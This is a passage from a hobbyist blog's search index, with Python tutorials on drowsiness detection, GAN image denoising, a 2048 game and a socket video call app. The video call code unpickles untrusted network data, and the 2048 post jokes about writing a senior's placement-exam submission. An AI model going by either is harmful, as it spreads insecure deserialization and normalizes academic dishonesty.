landmarks=predictor(gray,face) eye1=[] for n in range(36, 42): eye1.append(landmarks.part(n)) x = landmarks.part(n).x y = landmarks.part(n).y cv2.circle(gray, (x, y), 1, (255, 0, 0), 0) eye2=[] for n in range(42, 48): eye2.append(landmarks.part(n)) x = landmarks.part(n).x y = landmarks.part(n).y cv2.circle(gray, (x, y), 1, (255, 0, 0), 0) 🤧.. What? whats happening on above code ah? Looks like irritating..😖, Dont worry I will explain hehe..hah..🥲😅.\nLet me explain the above code, loading dlib facial landmarks and read an image frame from camera. Apply pretrained dlib facial landmarks alogrithm on resultant frame. There are total 68 facial landmarks (based on the model we choose).\nIn 68 landmarks, from 36 to 42 denote left eye and from 42 to 48 denotes right eye. Calculate EAR (Eye Aspect Ratio) def calculus(l): x_d=(l[1][0]-l[5][0])**2 y_d=(l[1][1]-l[5][1])**2 p2_p6=np.sqrt(x_d+y_d) x_d=(l[2][0]-l[4][0])**2 y_d=(l[2][1]-l[4][1])**2 p3_p5=np.sqrt(x_d+y_d) x_d=(l[0][0]-l[3][0])**2 y_d=(l[0][1]-l[3][1])**2 p1_p4=np.sqrt(x_d+y_d) ratio=(p2_p6+p3_p5)/p1_p4 return ratio eye=[] for i in eye1: p=str(i) try: x=int(p[1:4].strip()) y=int(p[6:len(p)-1].strip()) except: x=int(p[1:3].strip()) y=int(p[5:len(p)-1].strip()) eye.append([x,y]) ratio1=calclus(eye) eye=[] for i in eye2: p=str(i) try: x=int(p[1:4].strip()) y=int(p[6:len(p)-1].strip()) except: x=int(p[1:3].strip()) y=int(p[5:len(p)-1].strip()) eye.append([x,y]) ratio2=calclus(eye) EAR=(ratio1+ratio2)/4 Yoooo,Hohooo 🥳, we calculated the EAR(Eye Aspect Ratio) very finely. Really? How? I don\u0026rsquo;t understand the calculus part.. it looks like bricksblock in a row with some mathematical expression. Simply its calculates the ((p2-p6)+(p3-p6))/(p1-p4) hehe..^_^\nBOOM! we already achieved our final solution. Really? Ofcourse, Yes. we just need a loop to read frames from the camera and calculate EAR difference between two consecutive seconds.So we have to find the time difference and check if the EAR crossed threshhold values then check if the time difference between last blink time and present time crosses 2 seconds, then it means the driver going to sleep. So we need to play a alarm to wake him up.That\u0026rsquo;s it..! Done..🥲😌\nI think its fine and I really dont want to explain more than this 😜🙃.\ndetection_.py Hope you guys like this and Subscribe my Utube account 😂😂.\nThanks for reading! ","date":"Oct 10, 2020","img":"https://0x4ka5h.github.io/posts/driverdrowsinessdetection/images/home.png","permalink":"https://0x4ka5h.github.io/posts/driverdrowsinessdetection/","series":[],"tags":["Face Detection","Image Processing"],"title":"Driver Drowsiness Detection"},{"categories":["GAN's"],"content":"What is GAN\u0026rsquo;s? Generative Adversarial Networks GAN\u0026rsquo;s are one of the most interesting ideas in computer science today. Two models are trained simultaneously by an adversarial process. A generator learns to create images that look real, while a discriminator learns to tell real images apart from fakes. Case: I have read that, in most of the cases Doctors may face issues while they are making decisions over CT scanned Images because of Gaussian Noise and making electronic Noise (unwanted disturbance in a signal which is reflected in output). So I tried to implement and train a Deep Learning model using GAN Technology. Brief Solution: Step-1. Preprocessing the Data to train the model.\nStep-2. Generator Model: Used to generate new images which look like real images.\nStep-3. Discriminator Model: Used to classify images as real or fake.\nStep-4. Fitting the model.\nDetailed Solution: We’ll begin by importing needed libraries, considering you’ve installed all the necessary libraries already.\nimport matplotlib.pyplot as plt from IPython.display import display, HTML from PIL import Image,ImageFile import tensorFlow as tf from io import BytesIO import numpy as np import os,sys,math %matplotlib inline Okay,the libraries are succesfully imported and lets go to the next part of this process. Define some filters manually using numpy and image processing techniques to morph the original image.\ndef add_noise(a): a2 = a.copy() rows = a2.shape[0] cols = a2.shape[1] s = 2 # size of spot is 1/20 of smallest dimension for i in range(100): x = np.random.randint(cols-s) y = np.random.randint(rows-s) a2[y:(y+s),x:(x+s)] = 0 return a2 Now we had defined a simple noise funtion which is used to add some random noise pixels (blocks) to the input image \u0026lsquo;a\u0026rsquo;.Let\u0026rsquo;s try to load and pass the image to test above noise function.\nimage = tf.io.read_file(\u0026#39;sample.png\u0026#39;) img = tf.image.decode_png(image , channels=3) img = tf.image.convert_image_dtype(img, tf.float32) img = tf.image.resize(img, [128, 128]) plt.figure() plt.imshow(img) img_array = np.asarray(img) #cols, rows = img.size # Add noise img_array_noise = add_noise(img_array) plt.figure() plt.imshow(img_array_noise) Great, We have successfully implemented the noise function.Lets implement some more funtions which are also behaving like above noise functions but with different different noises.\ndef contrast(img): img=tf.image.random_contrast(img, 0.5, 0.7) return img img_array_noise = contrast(img_array) plt.figure() plt.imshow(img_array_noise) def pepper_noise(img): noise_factor = 0.08 input_image = img + noise_factor * tf.random.normal(img.shape) input_image = tf.squeeze(tf.clip_by_value(input_image, clip_value_min=0., clip_value_max=1.)) return input_image img_array_noise = pepper_noise(img_array) plt.figure() plt.imshow(img_array_noise) def gaussian_noise(image): with tf.name_scope(\u0026#39;Add_gaussian_noise\u0026#39;): noise = tf.random.normal(shape=tf.shape(image), mean=0.0, stddev=(50)/(255), dtype=tf.float32) noise_img = image + noise noise_img = tf.clip_by_value(noise_img, 0.0, 1.0) return noise_img img_array_noise = gaussian_noise(img_array) plt.figure() plt.imshow(img_array_noise) Let\u0026rsquo;s do the same for the whole data set and load them into pickle using numpy arrays for future use.\nimport pickle os.chdir(\u0026#39;/content/drive/MyDrive/project\u0026#39;) if \u0026#39;data.pkl\u0026#39; in os.listdir(): data=1 file = open(\u0026#34;/content/drive/MyDrive/project/data.pkl\u0026#34;, \u0026#34;rb\u0026#34;); x = pickle.load(file) y = pickle.load(file) else: x = np.array([],dtype=tf.float32) y = np.array([],dtype=tf.float32) for path, subdirs, files in os.walk(\u0026#39;path/training_images/\u0026#39;): for name in files: name = os.path.join(path,name) print(name,i) image = tf.io.read_file(name) img = tf.image.decode_png(image , channels=3) img = tf.image.convert_image_dtype(img, tf.float32) img = tf.image.resize(img, [128, 128]) a=0 # Add noise if a%4==0: img_array_noise = add_noise(img_array) elif a%4==1: img_array_noise = pepper_noise(img_array) elif a%4==2: img_array_noise = gaussian_noise(img_array) else: img_array_noise =contrast(img_array) a+=1 x=np.append(x,[img_array],axis=0) y=np.append(y,[img_array_noise],axis=0) x.shape,img_array.shape ((9287, 128, 128, 3), (128, 128, 3)) Lets check the loaded pickle data by loading the pickle.file and seee what comes.\nimport pickle if data != 2: plt.figure() plt.imshow(x[5001]) # Write to file. file = open(\u0026#34;/content/drive/MyDrive/project/data.pkl\u0026#34;, \u0026#34;wb\u0026#34;) pickle.dump(x, file) pickle.dump(y, file) file.close() x_train.shape,x_train_noisy.shape ((9287, 128, 128, 3), (9287, 128, 128, 3)) Yahooo! we are complete preprocessing the data for training GAN\u0026rsquo;s. Source dataPreprocessing.ipynb ##check part-2 for GAN\u0026rsquo;s implementatio Thanks for reading! ","date":"Sep 6, 2020","img":"https://0x4ka5h.github.io/posts/imagrestorationusinggans_1/images/home.jpg","permalink":"https://0x4ka5h.github.io/posts/imagrestorationusinggans_1/","series":[],"tags":["Machine Learning","Deep Learning","Image Processing"],"title":"Image Restoration Using GAN's Part-1"},{"categories":["GAN's"],"content":"Lets continue the part-1 ^_^ ;).., We already know that what GAN\u0026rsquo;s are and why they are used. Well, not really. GANs belong to implicit learning methods. In explicit learning models, the model learns its weights directly from the data. whereas in implicit learning, the model learns without the data directly passing through the network. so it is reinforcement learning? Not really Hah..,!\nAs of now,we already discussed that GAN\u0026rsquo;s have two model, and two models are trained simultaneously by an adversarial process. A generator learns to create images that look real, while a discriminator learns to tell real images apart from fakes. See what happens in this contest of discrimination and generation, we may think while the generator is almost discriminated, so it was trained heavely but the thing is the discriminator also trained harldy to discriminate images for small mistakes also.This is why GAN\u0026rsquo;s became intresting in Neural Networks.\nLoad required libraries from tensorflow import keras import tensorflow as tf import numpy as np from tensorflow.keras.preprocessing import image_dataset_from_directory from IPython import display import os,time Loading pickled data into NumPy array Load the Preprocessed Data into NumPy array which is created in Part-1. Pickled data contains preprocessed image data in array format.\nimport pickle # Read from file. file = open(\u0026#34;/../../data.pkl\u0026#34;, \u0026#34;rb\u0026#34;); x_train = pickle.load(file) x_train_noisy = pickle.load(file) file.close() spliting Data into Train and test data The train_test_split function allows you to break a dataset with ease while pursuing an ideal model. Also, keep in mind that your model should not be overfitting or underfitting.\nfrom sklearn.model_selection import train_test_split x_train_, x_test, x_train_noisy_, x_test_noisy = train_test_split(x_train, x_train_noisy,shuffle=128) BUFFER_SIZE = 400 BATCH_SIZE = 64 IMG_WIDTH = 256 IMG_HEIGHT = 256 EPOCHS = 150 OUTPUT_CHANNELS = 3 Implementation of GAN\u0026rsquo;s Upsampling and Downsampling of an Image Downsampling is the process of reducing the sampling rate of a signal. Downsample reduces the sampling rate of the input AOs by an integer factor by picking up one out of N samples. Note that no anti-aliasing filter is applied to the original data.\ndef downsample(filters, size, apply_batchnorm=True): initializer = tf.random_normal_initializer(0., 0.02) result = tf.keras.Sequential() result.add( tf.keras.layers.Conv2D(filters, size, strides=2, padding=\u0026#39;same\u0026#39;, kernel_initializer=initializer, use_bias=False)) if apply_batchnorm: result.add(tf.keras.layers.BatchNormalization()) result.add(tf.keras.layers.LeakyReLU()) return result Upsampling is the process of inserting zero-valued samples between original samples to increase the sampling rate. (This is sometimes called “zero-stuffing”.) This kind of upsampling adds undesired spectral images to the original signal, which are centered on multiples of the original sampling rate\ndef upsample(filters, size, apply_dropout=False): initializer = tf.random_normal_initializer(0., 0.02) result = tf.keras.Sequential() result.add( tf.keras.layers.Conv2DTranspose(filters, size, strides=2, padding=\u0026#39;same\u0026#39;, kernel_initializer=initializer, use_bias=False)) result.add(tf.keras.layers.BatchNormalization()) if apply_dropout: result.add(tf.keras.layers.Dropout(0.5)) result.add(tf.keras.layers.ReLU()) return result Loss Functions GANs try to replicate a probability distribution. They should therefore use loss functions that reflect the distance between the distribution of the data generated by the GAN and the distribution of the real data.\nGenerator Loss LAMBDA = 100 loss_object = tf.keras.losses.BinaryCrossentropy(from_logits=True) def generator_loss(disc_generated_output, gen_output, target): gan_loss = loss_object(tf.ones_like(disc_generated_output), disc_generated_output) # mean absolute error l1_loss = tf.reduce_mean(tf.abs(target - gen_output)) total_gen_loss = gan_loss + (LAMBDA * l1_loss) return total_gen_loss, gan_loss, l1_loss Discriminator Loss def discriminator_loss(disc_real_output, disc_generated_output): real_loss = loss_object(tf.ones_like(disc_real_output), disc_real_output) generated_loss = loss_object(tf.zeros_like(disc_generated_output), disc_generated_output) total_disc_loss = real_loss + generated_loss return total_disc_loss The Generator Model The Generator Model generates new images by taking a fixed size random noise as an input. Generated images are then fed to the Discriminator Model.\nThe main goal of the Generator is to fool the Discriminator by generating images that look like real images and thus makes it harder for the Discriminator to classify images as real or fake.\ndef Generator(): inputs = tf.keras.layers.Input((128, 128, 3)) print(1) down_stack = [ downsample(128, 4, apply_batchnorm=False), #downsample(64, 4, apply_batchnorm=False), # (bs, 128, 128, 64) #downsample(128, 4), # (bs, 64, 64, 128) downsample(256, 4), # (bs, 32, 32, 256) downsample(512, 4), # (bs, 16, 16, 512) downsample(512, 4), # (bs, 8, 8, 512) downsample(512, 4), # (bs, 4, 4, 512) downsample(512, 4), # (bs, 2, 2, 512) downsample(512, 4), # (bs, 1, 1, 512) ] up_stack = [ upsample(512, 4, apply_dropout=True), # (bs, 2, 2, 1024) upsample(512, 4), #apply_dropout=True), # (bs, 4, 4, 1024) upsample(512, 4), #apply_dropout=True), # (bs, 8, 8, 1024) upsample(512, 4), # (bs, 16, 16, 1024) upsample(256, 4), # (bs, 32, 32, 512) upsample(128, 4), # (bs, 64, 64, 256) #upsample(64, 4), # (bs, 128, 128, 128) #upsample(64, 4) ] initializer = tf.random_normal_initializer(0., 0.02) last = tf.keras.layers.Conv2DTranspose(OUTPUT_CHANNELS, 4, strides=2, padding=\u0026#39;same\u0026#39;, kernel_initializer=initializer, activation=\u0026#39;tanh\u0026#39;) # (bs, 256, 256, 3) x = inputs # Downsampling through the model skips = [] for down in down_stack: x = down(x) skips.append(x) skips = reversed(skips[:-1]) # Upsampling and establishing the skip connections for up, skip in zip(up_stack, skips): x = up(x) x = tf.keras.layers.Concatenate()([x, skip]) x = last(x) return tf.keras.Model(inputs=inputs, outputs=x) generator = Generator() tf.keras.utils.plot_model(generator, show_shapes=True, dpi=64) gen_output = generator(x_train_noisy_[0][tf.newaxis, ...], training=False) plt.imshow(gen_output[0, ...]) The Discriminator Model The Discriminator Model takes an image as an input (generated and real) and classifies it as real or fake.\nGenerated images come from the Generator and the real images come from the training data.\nThe discriminator model is the simple binary classification model.\nNow, let us combine both the architectures and understand them in detail.\ndef Discriminator(): initializer = tf.random_normal_initializer(0., 0.02) inp = tf.keras.layers.Input(shape=[128, 128, 3], name=\u0026#39;input_image\u0026#39;) tar = tf.keras.layers.Input(shape=[128, 128, 3], name=\u0026#39;target_image\u0026#39;) x = tf.keras.layers.concatenate([inp, tar]) # (bs, 256, 256, channels*2) down1 = downsample(64, 4, False)(x) #down1 = downsample(64, 4, False)(down1) # (bs, 128, 128, 64) #down2 = downsample(128, 4)(down1) # (bs, 64, 64, 128) down3 = downsample(256, 4)(down1) # (bs, 32, 32, 256) zero_pad1 = tf.keras.layers.ZeroPadding2D()(down3) # (bs, 34, 34, 256) conv = tf.keras.layers.Conv2D(512, 4, strides=1, kernel_initializer=initializer, use_bias=False)(zero_pad1) # (bs, 31, 31, 512) batchnorm1 = tf.keras.layers.BatchNormalization()(conv) leaky_relu = tf.keras.layers.LeakyReLU()(batchnorm1) zero_pad2 = tf.keras.layers.ZeroPadding2D()(leaky_relu) # (bs, 33, 33, 512) last = tf.keras.layers.Conv2D(1, 4, strides=1, kernel_initializer=initializer)(zero_pad2) # (bs, 30, 30, 1) return tf.keras.Model(inputs=[inp, tar], outputs=last) discriminator = Discriminator() tf.keras.utils.plot_model(discriminator, show_shapes=True, dpi=64) disc_out = discriminator([x_train_noisy_[0][tf.newaxis, ...], gen_output], training=False) plt.imshow(disc_out[0, ..., -1], vmin=-20, vmax=20, cmap=\u0026#39;RdBu_r\u0026#39;) plt.colorbar() Optimizers generator_optimizer = tf.keras.optimizers.Adam(2e-4, beta_1=0.5) discriminator_optimizer = tf.keras.optimizers.Adam(2e-4, beta_1=0.5) checkpoints Checkpoints capture the exact value of all parameters ( tf. Variable objects) used by a model. Checkpoints do not contain any description of the computation defined by the model and thus are typically only useful when source code that will use the saved parameter values is available.\ncheckpoint_dir = \u0026#39;/content/drive/MyDrive/project/training_checkpoints\u0026#39; checkpoint_prefix = os.path.join(checkpoint_dir, \u0026#34;ckpt\u0026#34;) checkpoint = tf.train.Checkpoint(generator_optimizer=generator_optimizer, discriminator_optimizer=discriminator_optimizer, generator=generator, discriminator=discriminator) generate images def generate_images(model, test_input, tar): print(111) prediction = model(test_input, training=True) print(111) plt.figure(figsize=(15, 15)) display_list = [test_input[0], tar[0], prediction[0]] title = [\u0026#39;Input Image\u0026#39;, \u0026#39;Ground Truth\u0026#39;, \u0026#39;Predicted Image\u0026#39;] for i in range(3): plt.subplot(1, 3, i+1) plt.title(title[i]) # getting the pixel values between [0, 1] to plot it. plt.imshow(display_list[i] * 0.5 + 0.5) plt.axis(\u0026#39;off\u0026#39;) plt.show() example_input=x_train_noisy_[100:101] example_target=x_train_[100:101] generate_images(generator, example_input, example_target) @tf.function def train_step(input_image, target, epoch): with tf.GradientTape() as gen_tape, tf.GradientTape() as disc_tape: gen_output = generator(input_image, training=True) disc_real_output = discriminator([input_image, target], training=True) disc_generated_output = discriminator([input_image, gen_output], training=True) gen_total_loss, gen_gan_loss, gen_l1_loss = generator_loss(disc_generated_output, gen_output, target) disc_loss = discriminator_loss(disc_real_output, disc_generated_output) generator_gradients = gen_tape.gradient(gen_total_loss, generator.trainable_variables) discriminator_gradients = disc_tape.gradient(disc_loss, discriminator.trainable_variables) generator_optimizer.apply_gradients(zip(generator_gradients, generator.trainable_variables)) discriminator_optimizer.apply_gradients(zip(discriminator_gradients, discriminator.trainable_variables)) with summary_writer.as_default(): tf.summary.scalar(\u0026#39;gen_total_loss\u0026#39;, gen_total_loss, step=epoch) tf.summary.scalar(\u0026#39;gen_gan_loss\u0026#39;, gen_gan_loss, step=epoch) tf.summary.scalar(\u0026#39;gen_l1_loss\u0026#39;, gen_l1_loss, step=epoch) tf.summary.scalar(\u0026#39;disc_loss\u0026#39;, disc_loss, step=epoch) lenl=len(x_test) def fitt(x_train_,x_train_noisy_, epochs, x_test,x_test_noisy): k=0 for epoch in range(epochs): start = time.time() display.clear_output(wait=True) #lenl=len(x_test) example_input=x_test_noisy[k:k+1] example_target=x_test[k:k+1] generate_images(generator, example_input, example_target) if k==lenl-2: k=0 k+=1 print(\u0026#34;Epoch: \u0026#34;, epoch) # Train n=0 s=0 for i in range(len(x_train_)): if (n+1) % 100 == 0: print(\u0026#39;.\u0026#39;, end=\u0026#39;\u0026#39;) s+=1 n=0 if s==100: print() s=0 input_image=x_train_noisy_[i:i+1] target=x_train_[i:i+1] train_step(input_image, target, 1) n+=1 \u0026#39;\u0026#39;\u0026#39;for n, (input_image, target) in train_ds.enumerate(): print(\u0026#39;.\u0026#39;, end=\u0026#39;\u0026#39;) if (n+1) % 100 == 0: print() train_step(input_image, target, epoch)\u0026#39;\u0026#39;\u0026#39; print() # saving (checkpoint) the model every 20 epochs if (epoch + 1) % 3 == 0: !rm -Rf /content/drive/MyDrive/project/training_checkpoints/ckpt-* checkpoint.save(file_prefix=checkpoint_prefix) print (\u0026#39;Time taken for epoch {} is {} sec\\n\u0026#39;.format(epoch + 1, time.time()-start)) checkpoint.save(file_prefix=checkpoint_prefix) Source imageRestorationUsingGans.ipynb Thanks for reading! ","date":"Sep 6, 2020","img":"https://0x4ka5h.github.io/posts/imagerestorationusinggans_2/images/home.jpg","permalink":"https://0x4ka5h.github.io/posts/imagerestorationusinggans_2/","series":[],"tags":["Machine Learning","Deep Learning","Image Processing"],"title":"Image Restoration Using GAN's Part-2"},{"categories":["Game"],"content":"Introduction Hey mates😊. How are you? Hope you all begin well. Do you know 2048 game? Yeah! Of course, everyone knew that. Ok then, Let me create it on my own 🥲.\nWhy I\u0026rsquo;m doing this GameBoard? Actually, One of my seniors in my college asked me to do this for their exam. That senior need to submit this GameBoard code which is written in python to get selected for InterView in OffCampus placement. OMG author, Did seniors asks you to code their project? Yes, but some seniors only 🥱. Is it true😬? Ofcourse yes rey🤫. But .. ? Just stop asking question🤧?\nLets Code it. Total number of blocks in 2048 is 16 which is looks like 4x4 matrix. First of all we need a empty board to start the game. So we have to create a empty 2D array of length 4 and width also 4. And at starting of the game we also need to generate the board with a value 2 at random place.\nimport random emptyIndexCount = 16 gameBoard = [\t[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0] ] seedIndex = random.randint(1,16) gameBoard[seedIndex_//4][seedIndex_-4*(seedIndex_//4)] = 2 print(gameBoard) [[0, 0, 0, 0], [0, 0, 0, 0], [0, 2, 0, 0], [0, 0, 0, 0]] Now our initial step to build gameBoard is successfully done. So Now going to step2, In step 2 user need to give input to gameBoard. Initially let work on left move. So when user gives left Input then what we need to do is remove empty indexes and collect others values in each row and shift them to left. ex: for above array after left shift\n[[0, 0, 0, 0], [0, 0, 0, 0], [2, 0, 0, 0], [0, 0, 0, 0]] After shifting value to left we need to add values if corresponding index holded values are same and move to left by 1 index.\n[[0,2,2,4]] =\u0026gt; [[2,2,4,0]] =\u0026gt; [[4,4,0,0,]] lets implement this\nuserInput_ = input(\u0026#34;1-up/2-down/3-right/4-left: \u0026#34;) if int(userInput_) == 4: for i in range(4): columnList = gameBoard[i] _backupList = [i for i in columnList if i!=0]+[0,0,0,0] _backupList = _backupList[0:4] print() gameBoard[i] = _backupList for i in range(4): if gameBoard[i][0] == gameBoard[i][1]: gameBoard[i][0] = gameBoard[i][1] + gameBoard[i][0] if gameBoard[i][1] == gameBoard[i][2]: gameBoard[i][1] = gameBoard[i][1] + gameBoard[i][2] gameBoard[i][2] = 0 gameBoard[i][3] = 0 else: gameBoard[i][1] = gameBoard[i][2] gameBoard[i][2] = gameBoard[i][3] gameBoard[i][3] = 0 elif gameBoard[i][1] == gameBoard[i][2]: gameBoard[i][1] = gameBoard[i][1] + gameBoard[i][2] gameBoard[i][2] = gameBoard[i][3] gameBoard[i][3] = 0 elif gameBoard[i][2] == gameBoard[i][3]: gameBoard[i][2] = gameBoard[i][2] + gameBoard[i][3] gameBoard[i][3] = 0 In the above code I have checked that if corresponding values in the resultant array is matched then I add them and replace the result sum with first indexed value.\n[[0,2,4,4]] =\u0026gt; [[2,4,4]]+[[0]] =\u0026gt; [[2,4,4,0]] =\u0026gt; [[2,8,0,0]] Huh! Irritating arrays right? haha .. yes but very easy. And one more thing Now we have to generate another number in random position in gameBoard. So, first we need to take list of empty indexes and the count of that list. And that random number is between 0 to maxnumber which is existed in gameBoard.\nseedNumber_ = [2,4,8,16,32,64,128,254,512,1024,2048] maxNumber = 0 count_=0 index = [] indexCount = 0 for row in gameBoard: for col in row: if col==0: count_+=1 index.append(indexCount) if col\u0026gt;maxNumber_: maxNumber_ = col indexCount+=1 seedIndex_ = random.choice(index) if maxNumber_==0: randomSeed_ = 2 else: #print(random.choice(seedNumber_[0:seedNumber_.index(maxNumber_)+1])) randomSeed_ = random.choice(seedNumber_[0:seedNumber_.index(maxNumber_)+1]) #\tprint(maxNumber_) gameBoard[seedIndex_//4][seedIndex_-4*(seedIndex_//4)] = randomSeed_ print(gameBoard) This will generate the new random value in any of the empty indexes.\n[[0, 0, 0, 0], [0, 0, 2, 0], ==\u0026gt; generated random value at gameBoard[1][2] position [2, 0, 0, 0], [0, 0, 0, 0]] Okay! Same for the right but the list is reversed in above code\u0026rsquo;s first if condition\nuserInput_ = input(\u0026#34;1-up/2-down/3-right/4-left: \u0026#34;) if int(userInput_) == 3: for i in range(4): columnList = gameBoard[i] _backupList = [i for i in columnList if i!=0]+[0,0,0,0] _backupList = _backupList[0:4][::-1] print() gameBoard[i] = _backupList for i in range(4): if gameBoard[i][3] == gameBoard[i][2]: gameBoard[i][3] = gameBoard[i][3] + gameBoard[i][2] if gameBoard[i][1] == gameBoard[i][2]: gameBoard[i][2] = gameBoard[i][2] + gameBoard[i][1] gameBoard[i][1] = 0 gameBoard[i][0] = 0 else: gameBoard[i][2] = gameBoard[i][1] gameBoard[i][1] = gameBoard[i][0] gameBoard[i][0] = 0 elif gameBoard[i][1] == gameBoard[i][2]: gameBoard[i][2] = gameBoard[i][1] + gameBoard[i][2] gameBoard[i][1] = gameBoard[i][0] gameBoard[i][0] = 0 elif gameBoard[i][1] == gameBoard[i][0]: gameBoard[i][1] = gameBoard[i][1] + gameBoard[i][0] gameBoard[i][0] = 0 This will throw value in gameboard to right side and new random value also generated because of loop.\n[[0, 0, 0, 0], [0, 0, 0, 2], [0, 2, 0, 2], ==\u0026gt; generated random value at gameBoard[2][1] position [0, 0, 0, 0]] We are completed the Left and Right key operation to 2048 gameBoard. Now, we need to perform Up and Down key to the gameBoard. So let us do for UP key first\nWhen Up key presses what happends in gameBoard?\n2048GameBoard.py Hope you guys like and Subscribe to this Utube account 😂😂.\nThanks for reading! ","date":"Apr 17, 2020","img":"","permalink":"https://0x4ka5h.github.io/posts/2048withpython/","series":[],"tags":["",""],"title":"2048 With Python"},{"categories":["Socket"],"content":"Introduction Hey mates😊. How are you? Hope you all are begin good.By the way, This is my first blog. Did you know my name 🥱? Well, I am Akash.\nWhy we are here? To make some fun? 😕! No, But we\u0026rsquo;re here to learn something new in a funny way. Funny while learning😒? Yeah!.,\nBy the way, What\u0026rsquo;s the new thing? Guess? 🤔🤔.. How to copy some code from StackOverflow easily using python? 😅, No. We are here to learn How to code Simple VideoCall App with python sockets.\nVideoCall App? Android Application ah? No, Just a simple python interpreter application. But useful for future step😊.\nAbout project ..! This is a simple VideoCallApp created with python script using sockets and opencv. We are creating a simple TCP protocol using python sockets. We will read Video data from camera or webcam using opencv and Audio from microphone using pyAudio which are under Async function. I\u0026rsquo;m using two open ports to make communication between server and client. One port is for Video Transmission and one port is for Audio Transmission. I think by using two ports there will be no disturbances in socket communication.\nWhy I did this project ? I think it\u0026rsquo;s 2019 September. I was studying Engg-1. Most of my friends are using smartphones and I\u0026rsquo;m using a Jio smartPhone(KeyBoard phone). I was very curious about networking at that time. My friends are doing Videochat with thier friends in smartphone, but I dont have one. One day I got this idea, why don\u0026rsquo;t I made my own VideoCallingApp. I was already knew Image processing and openCV. So I can manage VideoStream and Audio too. That\u0026rsquo;s why I decided to do this App.\nLibraries I\u0026rsquo;m using python to create this Application. Here are the list of libraries I had used to build this application\nimport cv2, numpy as np import pyaudio import socket import pickle import sys,time Socket is python Library used to connect two nodes on a network to communicate with each other. One socket(node) listens on a particular port at an IP, while the other socket reaches out to the other to form a connection. The server forms the listener socket while the client reaches out to the server. pyAudio is used to read and write data from microphone. opencv is also used to read data from webcam How to create socket and Bind connection ## serverside simpleSocket= socket.socket(socket.AF_INET,socket.SOCK_STREAM) simpleSocket.bind((\u0026#39;IP\u0026#39;,\u0026#39;PORT\u0026#39;)) simpleSocket.listen(5) conn , addr = simpleSocket.accept() conn.send(b\u0026#34;123 -- sent by server\u0026#34;) ## clientSide simpleSocket_ = socket.socket(socket.AF_INET,socket.SOCK_STREAM) simpleSocket_.connect((\u0026#39;IP\u0026#39;,\u0026#39;PORT\u0026#39;)) data = simpleSocket.recv(21) print(str(data)) b'123 -- sent by server' This is the example of simple socket connection between a server and client. AF_INET is the Internet address family for IPv4. SOCK_STREAM is the socket type for TCP, the protocol that will be used to transport our messages in the network.\nRead data from webCam and MicroPhone ## reading data from webCamera video = cv2.VideoCapture(0) _, frame = video.read() print(frame) video.release() cv2.destroyAllWindows() ## Reading data from microPhone chunk = 1024 FORMAT = pyaudio.paInt16 CHANNELS = 1 RATE = 44100 p = pyaudio.PyAudio() #initializing microphone stream = p.open(format = FORMAT, channels = CHANNELS, rate = RATE, input = True, frames_per_buffer = chunk ) stream.read(chunk) print(stream) prints ImageData in RGB array format prints AudioData in 1D array format Sending and Receiving Data from socket ##################### ImageData ################ ## serverSide length = 0 while length\u0026lt;921764: pac=simpleSocket.recv(9999999) length+=len(pac) data+=pac receivedImage=pickle.loads(data) ## clientSide img_data=np.array(frame) data=pickle.dumps(img_data) simpleSocket_.send(data) #################### AudioData ################# #serverSide audioData = simpleSocket.recv(chunk) audioData = pickle.loads(audioData) stream.write(audioData) #clientSide data = stream.read(chunk) if data: simpleSocket_.send(data) receivedImage =\u0026gt; imageData is sent from client's socket and received to server's socket stream.write =\u0026gt; audio data is read from microphone and sent from client's socket and received to server's socket and writes data on stream That\u0026rsquo;s it! We partially completed our main goal of the project. We received Image data and mircoPhone data from client to server for one time.\nBut the thing is, If we run a loop to send and retreive data from client to server its like first it sends image data and then microphone data. Again repeat..!. But we want Async data retreival from client to run video and audio simultaneously. So we use Threads to do this.\nAsync ##################### ClientSide ################# from threading import Thread def recordAudio(): time.sleep(5) while True: data = stream.read(chunk) if data: simpleSocket_.sendall(data) def sendVideo(): global conn,video while 1: try: _,frame=video.read() img_data=np.array(frame) data=pickle.dumps(img_data) conn.send(data) except KeyboardInterrupt: video.release() sys.exit() sendVideo = serverVideo.sendVideo sendAudio = serverAudio.recordAudio sendV = Thread(target = sendVideo) sendA = Thread(target = sendAudio) recvA.start() sendA.start() ####################### serverSide ################# from threading import Thread def rcvAudio(): while True: audioData = simpleSocket.recv(chunk) audioData = pickle.loads(audioData) stream.write(audioData) def recvVideo(): global conn while 1: try: data=b\u0026#34;\u0026#34; length=0 while length\u0026lt;921764: pac=conn.recv(9999999) length+=len(pac) data+=pac if data: imgData=pickle.loads(data) cv2.imshow(\u0026#34;ClientData\u0026#34;,imgData) key=cv2.waitKey(1) if key == 27: break except KeyboardInterrupt: sys.exit() recvVideo = serverVideo.recvVideo recvAudio = serverAudio.rcvAudio recvA = Thread(target = recvAudio) recvV = Thread(target = recvVideo) recvV.start() sendV.start() Now, server gets continious data of Clients Video and Audio. Now, We just have to write receieve functions for Image and Audio data in client side and sending function in serverside.\nsimpleVideoCallApp Hope you guys like and Subscribe to this Utube account 😂😂.\nThanks for reading! ","date":"Jan 20, 2020","img":"https://0x4ka5h.github.io/posts/simplevideocallapp/images/1.png","permalink":"https://0x4ka5h.github.io/posts/simplevideocallapp/","series":[],"tags":["ImageProcessing","openCV"],"title":"A Simple Video Call App With Python Sockets"}]